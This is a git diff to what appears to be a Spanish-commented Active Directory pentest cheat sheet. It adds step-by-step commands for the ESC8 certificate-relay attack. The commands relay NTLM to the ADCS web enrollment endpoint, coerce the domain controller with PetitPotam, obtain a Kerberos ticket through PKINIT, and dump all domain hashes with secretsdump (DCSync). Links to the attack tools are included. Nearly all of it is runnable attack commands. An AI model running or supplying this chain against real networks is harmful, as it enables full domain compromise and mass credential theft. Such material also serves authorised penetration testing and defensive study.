@@ -139,14 +139,38 @@ certipy auth -pfx administrator.pfx -dc-ip DCIP
 
 ESC8 is when an Enrollment Service has installed and enabled HTTP Web Enrollment.
 
+#### Linux
 
 ```bash
+# para Kali
+# Levantar Listener
 sudo certipy relay -ca <DNS Name or IP> -template DomainController
-petitpotam.py listenerIP DCIP
+# Coerce
+python3 PetitPotam.py -u user -p 'pass' -d 'domain.com' attackerListenerIP DCIP
+# Auth
 certipy auth -pfx DC.pfx -dc-ip DCIP
+# Para windows porque certipy no anda bien en windows
+# Levantar Listener
+```
+
+#### Windows
+
+> Certipy no anda bien en windows
+
+```bash
+ntlmrelayx.py -t http://<IP ADCS Server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# Coerce
+python3 PetitPotam.py -u user -p 'pass' -d 'domain.com' attackerListenerIP DCIP
+# En pantalla se debe de obtener un ticket lo tomamos y lo guardamos con ticket.b64, reemplazamos dc01 por el nombre del DC
+python3 gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'domain.com'/'dc01$' 'dc01.ccache'
+# Ya podemos utilizar el TGT para realizar DCSync ya que el DC tiene permisos de DCSync
+export KRB5CCNAME=/path/to/dc01.ccache
+secretsdump -k -no-pass domain.com/'dc01$'@dc01.essos.local
 ```
 
 - https://github.com/decoder-it/ADCSCoercePotato/
+- https://github.com/topotam/PetitPotam
+- https://github.com/dirkjanm/PKINITtools/raw/master/gettgtpkinit.py
 
 ###  No Security Extension - ESC9
 
